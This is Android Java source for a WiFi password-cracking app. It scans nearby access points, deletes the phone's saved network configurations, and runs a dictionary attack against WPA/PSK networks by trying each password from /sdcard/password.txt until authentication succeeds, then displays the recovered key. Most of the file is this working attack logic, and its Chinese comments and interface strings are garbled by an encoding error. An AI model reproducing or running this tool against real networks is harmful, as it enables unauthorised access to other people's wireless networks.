package wificrack;

import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.wifi.ScanResult;
import android.net.wifi.SupplicantState;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiConfiguration.Status;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.preference.Preference;
import android.preference.Preference.OnPreferenceClickListener;
import android.preference.PreferenceActivity;
import android.preference.PreferenceFragment;  
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.MenuItem.OnMenuItemClickListener;

import java.io.FileNotFoundException;
import java.util.List;

public class WiFiCrackActivity extends PreferenceActivity{
    private WifiManager wm;
    private WifiReceiver wifiReceiver;
    private AccessPoint ap;
    private AccessPoint tmpap;
    private Preference preference;
    private String password;
    private List<WifiConfiguration> configs;
    private IntentFilter intentFilter;
    private PasswordGetter passwordGetter;
    private boolean cracking;
    private WifiConfiguration config;
    private int netid;
    private static final String TAG = "==WifiCracker==";
    List<ScanResult> results;
    ScanResult result;
    
    @SuppressWarnings("deprecation")
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
     //   setContentView(R.layout.main);
        
        try {
			passwordGetter = new PasswordGetter("/sdcard/password.txt");
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

        wm = (WifiManager) getSystemService(WIFI_SERVICE);
        if(!wm.isWifiEnabled())
            wm.setWifiEnabled(true);    //����WIFI
        
        //disableSavedConfigs();
        deleteSavedConfigs();
        cracking = false;
        netid = -1;
        
        wifiReceiver = new WifiReceiver();
        intentFilter = new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION);
        intentFilter.addAction(WifiManager.SUPPLICANT_STATE_CHANGED_ACTION);
        registerReceiver(wifiReceiver, intentFilter);
        
        wm.startScan(); //��ʼɨ������  
    }
           
    @Override
    protected void onStop() {
        unregisterReceiver(wifiReceiver);
        super.onStop();
    }

    @Override
    protected void onResume() {
        registerReceiver(wifiReceiver, intentFilter);        
        super.onResume();
    }  
    

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        menu.add("ɨ��").setOnMenuItemClickListener(new OnMenuItemClickListener() {
            
            @SuppressWarnings("deprecation")
			public boolean onMenuItemClick(MenuItem item) {
                if (!cracking){
                    results = null;
                    getPreferenceScreen().removeAll();
                    deleteSavedConfigs();
                    wm.startScan();
                }
                return true;
            }
        });
        menu.add("ֹͣ").setOnMenuItemClickListener(new OnMenuItemClickListener() {
            
            public boolean onMenuItemClick(MenuItem item) {
                if (cracking){
                    cracking = false;
                    enablePreferenceScreens(true);                    
                }
                return true;
            }
        });
        return super.onCreateOptionsMenu(menu);
    }
    
    class WifiReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {        
            String action = intent.getAction();
            if (WifiManager.SCAN_RESULTS_AVAILABLE_ACTION.equals(action)) {
                if (results == null)    //ֻ��ʼ��һ��
                    results = wm.getScanResults();
                try {
                    setTitle("WIFI���ӵ����Ϊ:"
                            + String.valueOf(getPreferenceScreen().getPreferenceCount()));
                } catch (Exception e) {
                    e.printStackTrace();
                }
                if( cracking == false)  //�ƽ�WIFI����ʱ�����½���
                    update();                
            } else if (WifiManager.SUPPLICANT_STATE_CHANGED_ACTION.equals(action)) {
                WifiInfo info = wm.getConnectionInfo();
                SupplicantState state = info.getSupplicantState();
                String str = null;
                if (state == SupplicantState.ASSOCIATED){
                    str = "����AP���";
                } else if(state.toString().equals("AUTHENTICATING")/*SupplicantState.AUTHENTICATING*/){
                    str = "������֤";
                } else if (state == SupplicantState.ASSOCIATING){
                    str = "���ڹ���AP...";
                } else if (state == SupplicantState.COMPLETED){
                    if(cracking) {
                        cracking = false;
                        showMessageDialog("��ϲ���������ܳ����ˣ�", "����Ϊ��"
                                + AccessPoint.removeDoubleQuotes(password), 
                                "ȷ��", false, new OnClickListener(){
    
                            public void onClick(DialogInterface dialog, int which) {
                                wm.disconnect();
                                enablePreferenceScreens(true);
                            }                        
                        });
                        cracking = false;
                        return;
                    } else
                        str = "������";
                } else if (state == SupplicantState.DISCONNECTED){
                    str = "�ѶϿ�";
                } else if (state == SupplicantState.DORMANT){
                    str = "��ͣ�";
                } else if (state == SupplicantState.FOUR_WAY_HANDSHAKE){
                    str = "��·������...";
                } else if (state == SupplicantState.GROUP_HANDSHAKE){
                    str = "GROUP_HANDSHAKE";
                } else if (state == SupplicantState.INACTIVE){
                    str = "������...";
                    if (cracking) connectNetwork(); //��������     
                } else if (state == SupplicantState.INVALID){
                    str = "��Ч";
                } else if (state == SupplicantState.SCANNING){
                    str = "ɨ����...";
                } else if (state == SupplicantState.UNINITIALIZED){
                    str = "δ��ʼ��";
                }
                setTitle(str);
                final int errorCode = intent.getIntExtra(WifiManager.EXTRA_SUPPLICANT_ERROR, -1);
                if (errorCode == WifiManager.ERROR_AUTHENTICATING) {
                    Log.d(TAG, "WIFI��֤ʧ�ܣ�");
                    setTitle("WIFI��֤ʧ�ܣ�");
                    if( cracking == true)
                        connectNetwork();
                }
            }            
        }           
    } 
    
    private void deleteSavedConfigs(){
        configs = wm.getConfiguredNetworks();
        for (int i = 0; i < configs.size(); i++) {
            config = configs.get(i);
            config.priority = i + 2;    //�����ȼ��ź�
            wm.removeNetwork(config.networkId); 
        }
        wm.saveConfiguration();
    }
    /**
     * �����ѱ����WIFI����
     */
    @SuppressWarnings("unused")
    private void disableSavedConfigs(){
        configs = wm.getConfiguredNetworks();
        for (int i = 0; i < configs.size(); i++) {
            config = configs.get(i);
            config.priority = i + 2;    //�����ȼ��ź�
            config.status = Status.DISABLED;//���������ѱ����networks
            //wm.removeNetwork(config.networkId); 
            Log.d(TAG, String.valueOf(config.networkId)+ "->" +config.SSID);
            addPreferencesFromResource(com.ndsec.wifisec.R.xml.wifi_access_points);   //���һ��
            preference = findPreference("wifi_accesspoint");
            preference.setKey(AccessPoint.removeDoubleQuotes(config.SSID));     //��������key
            preference.setTitle(AccessPoint.removeDoubleQuotes(config.SSID));
            preference.setOnPreferenceClickListener(new OnPreferenceClickListener() {
                
                public boolean onPreferenceClick(Preference pre) {
                    configs = wm.getConfiguredNetworks();
                    for (int i = 0; i < configs.size(); i++){
                        config = configs.get(i);
                        if(AccessPoint.removeDoubleQuotes(config.SSID).equals(pre.getTitle().toString()))break; //����SSID��ȡScanResult
                    }
                    tmpap = new AccessPoint(WiFiCrackActivity.this, config);
                    Log.d(TAG, tmpap.toString());
                    checkAP();
                    return true;
                }
            });
            preference.setSummary("�ź�ǿ�ȣ����ڷ�Χ��");  
        }
        wm.saveConfiguration();     //�������
    }
    
    /**
     * ���û���������б���
     * @param bEnable
     */
    private void enablePreferenceScreens(boolean bEnable){
        int count = getPreferenceScreen().getPreferenceCount();
        for (int i = 0; i < count; i++) {
            Preference  preference = getPreferenceScreen().getPreference(i);
            preference.setEnabled(bEnable);
        }
    }
    
    /**
     * ����ɨ�赽��AP
     */
    private void update() {
        addPreferenceFromScanResult();
    }
    
    /**
     * ��ɨ��AP�Ľ����ӵ�����
     */
    private void addPreferenceFromScanResult(){
        if (results == null) return;
        for (int i = 0; i < results.size(); i++){
            final ScanResult sr = results.get(i);
            tmpap = new AccessPoint(WiFiCrackActivity.this, sr);
            
            preference = findPreference(sr.SSID);
            if (preference != null){
                Log.d(TAG, "����SSID��" + sr.SSID);
                wm.updateNetwork(tmpap.mConfig);   //����
                wm.saveConfiguration();
                preference.setSummary("�ź�ǿ�ȣ�" + String.valueOf(tmpap.getLevel()));   
                continue;
            }
            addPreferencesFromResource(com.ndsec.wifisec.R.xml.wifi_access_points);   //���һ��
            preference = findPreference("wifi_accesspoint");
            preference.setKey(sr.SSID);     //��������key
            preference.setTitle(sr.SSID);
            preference.setSummary("�ź�ǿ�ȣ�" + String.valueOf(tmpap.getLevel()));                
            preference.setOnPreferenceClickListener(new OnPreferenceClickListener() {
                
                public boolean onPreferenceClick(Preference pre) {  //WIFI�����б����¼�����
                    for (int i = 0; i < results.size(); i++){
                        result = results.get(i);
                        if(result.SSID == pre.getTitle())break; //����SSID��ȡScanResult
                    }
                    tmpap = new AccessPoint(WiFiCrackActivity.this, result);
                    checkAP();        
                    return true;
                }                             
            });
        }
    }
    
    private void checkAP() {
        if (tmpap.security == AccessPoint.SECURITY_NONE) {
            setTitle("��APû�м��ܣ�����Ҫ�ƽ⣡");
            return;
        } else if((tmpap.security == AccessPoint.SECURITY_EAP) || (tmpap.security == AccessPoint.SECURITY_WEP)){
            setTitle("�ݲ�֧��EAP��WEP���ܷ�ʽ���ƽ⣡");
            return;
        }

        showMessageDialog("WIFI�ȵ���Ϣ", tmpap.toString(), "�ƽ�", true, new OnClickListener() {                
            public void onClick(DialogInterface dialog, int which) {
                cracking = true;
                setTitle("�����ƽ�...");
                try {
                    ap = tmpap;
                    connectNetwork(); //��������
                    enablePreferenceScreens(false);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });       
        
    }
    
    private void connectNetwork() {
        if (cracking) {
            ap.mConfig.priority = 1;
            ap.mConfig.status = WifiConfiguration.Status.ENABLED;
            password = passwordGetter.getPassword();    //���ⲿ�ֵ��������
            if (password == null || password.length() == 0){
                setTitle("���뱾�Ѳ½���ϣ�û���ܳ����룡");
                cracking = false;
                showMessageDialog("��ʾ", "�Ƿ��������뱾��", "�ƽ�", true, new OnClickListener() {                
                    public void onClick(DialogInterface dialog, int which) {
                        passwordGetter.reSet();                    
                    }
                });
                enablePreferenceScreens(true);
                return;
            }
            password = "\"" + password + "\"";
            ap.mConfig.preSharedKey = password;     //��������
            Log.d(TAG, ap.toString());
            if(netid == -1) {
                netid = wm.addNetwork(ap.mConfig);
                ap.mConfig.networkId = netid;
                Log.d(TAG, "���APʧ��");
            } else
                wm.updateNetwork(ap.mConfig);
            setTitle("��������:" + ap.mConfig.SSID + "����:" + ap.mConfig.preSharedKey);
            //enableNetwork��saveConfiguration��reconnectΪconnectNetwork��ʵ��       
            if(wm.enableNetwork(netid, false))
                setTitle("��������ʧ��");
            wm.saveConfiguration();
            wm.reconnect(); //����AP
        }
    }
    
    private void showMessageDialog(String title, String message, String positiveButtonText, boolean bShowCancel, DialogInterface.OnClickListener positiveButtonlistener) {
        AlertDialog.Builder builder = new Builder(WiFiCrackActivity.this);
        builder.setTitle(title);
        builder.setMessage(message);
        builder.setPositiveButton(positiveButtonText, positiveButtonlistener);
        if (bShowCancel){
            builder.setNegativeButton("ȡ��", new OnClickListener() {                
                public void onClick(DialogInterface dialog, int which) {                    
                }
            });
        }
        builder.create().show();
    }

    @Override
    protected void onDestroy() {
        if (passwordGetter != null)
            passwordGetter.Clean();
        super.onDestroy();
    }    
}
